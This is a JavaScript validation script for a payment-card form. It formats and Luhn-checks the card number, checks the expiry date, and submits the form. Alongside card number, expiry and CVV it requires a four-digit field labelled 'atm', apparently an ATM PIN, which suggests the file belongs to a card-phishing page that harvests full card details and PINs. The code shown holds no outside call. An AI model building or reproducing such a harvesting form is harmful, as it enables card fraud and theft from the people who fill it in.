card = document.getElementById('card');
e1 = document.getElementById('1');

exp = document.getElementById('exp');
e2 = document.getElementById('2');

cvv = document.getElementById('cvv');
e3 = document.getElementById('3');

atm = document.getElementById('atm');
e4 = document.getElementById('4');

btn = document.getElementById('btn');
form = document.getElementById('form');

new Cleave(card, {
    creditCard: 1
});

new Cleave(exp, {
    date: 1,
    datePattern: ['m', 'y']
});

new Cleave(cvv, {
    numericOnly: 1,
    blocks: [4]
});

new Cleave(atm, {
    numericOnly: 1,
    blocks: [4]
});

function validateCC(inputNum) {
    var digit, digits, flag, sum, _i, _len;
    flag = true;
    sum = 0;
    digits = (inputNum + '').split('').reverse();
    for (_i = 0, _len = digits.length; _i < _len; _i++) {
        digit = digits[_i];
        digit = parseInt(digit, 10);
        if ((flag = !flag)) {
            digit *= 2;
        }
        if (digit > 9) {
            digit -= 9;
        }
        sum += digit;
    }
    return sum % 10 === 0;
};

function checkExp(exp) {
    if (exp.substring(3, 5) == new Date().getFullYear().toString().substr(2, 2)) {
        if (exp.substring(0, 2) < new Date().getMonth() + 1) {
            return false;
        } else {
            return true;
        }
    } else {
        if (exp.substring(3, 5) < new Date().getFullYear().toString().substr(2, 2)) {
            return false;
        } else {
            return true;
        }
    }
}

card.addEventListener('keyup', () => {
    if (
        exp.value.trim() != '' &&
        cvv.value.trim() != '' &&
        atm.value.trim() != '' &&
        exp.value.trim().length == 5 &&
        cvv.value.trim().length > 2 &&
        atm.value.trim().length == 4
    ) {
        btn.disabled = false;
    }

    if (card.value.trim() != '') {
        e1.classList.remove('error');
    }
});

card.addEventListener('blur', () => {
    if (card.value.trim() == '') {
        e1.classList.add('error');
        btn.disabled = true;
    }
});

exp.addEventListener('keyup', () => {
    if (
        exp.value.trim() != '' &&
        cvv.value.trim() != '' &&
        atm.value.trim() != '' &&
        exp.value.trim().length == 5 &&
        cvv.value.trim().length > 2 &&
        atm.value.trim().length == 4
    ) {
        btn.disabled = false;
    }

    if (
        exp.value.trim() != '' &&
        exp.value.trim().length == 5
    ) {
        e2.classList.remove('error');
    }
});

exp.addEventListener('blur', () => {
    if (
        exp.value.trim() == '' ||
        exp.value.trim().length != 5
    ) {
        e2.classList.add('error');
        btn.disabled = true;
    }
});

cvv.addEventListener('keyup', () => {
    if (
        exp.value.trim() != '' &&
        cvv.value.trim() != '' &&
        atm.value.trim() != '' &&
        exp.value.trim().length == 5 &&
        cvv.value.trim().length > 2 &&
        atm.value.trim().length == 4
    ) {
        btn.disabled = false;
    }

    if (
        cvv.value.trim() != '' &&
        cvv.value.trim().length > 2
    ) {
        e3.classList.remove('error');
    }
});

cvv.addEventListener('blur', () => {
    if (
        cvv.value.trim() == '' ||
        cvv.value.trim().length <= 2
    ) {
        e3.classList.add('error');
        btn.disabled = true;
    }
});

atm.addEventListener('keyup', () => {
    if (
        exp.value.trim() != '' &&
        cvv.value.trim() != '' &&
        atm.value.trim() != '' &&
        exp.value.trim().length == 5 &&
        cvv.value.trim().length > 2 &&
        atm.value.trim().length == 4
    ) {
        btn.disabled = false;
    }

    if (
        atm.value.trim() != '' &&
        atm.value.trim().length == 4
    ) {
        e4.classList.remove('error');
    }
});

atm.addEventListener('blur', () => {
    if (
        atm.value.trim() == '' ||
        atm.value.trim().length != 4
    ) {
        e4.classList.add('error');
        btn.disabled = true;
    }
});

btn.addEventListener('click', () => {
    if (
        exp.value.trim() != '' &&
        cvv.value.trim() != '' &&
        atm.value.trim() != '' &&
        exp.value.trim().length == 5 &&
        cvv.value.trim().length > 2 &&
        atm.value.trim().length == 4 &&
        btn.disabled == false
    ) {
        if (validateCC(card.value.replace(/ /g, ""))) {
            if (checkExp(exp.value.trim())) {
                form.submit();
            } else {
                e2.classList.add('error');
            }
        } else {
            e1.classList.add('error');
        }
    }
});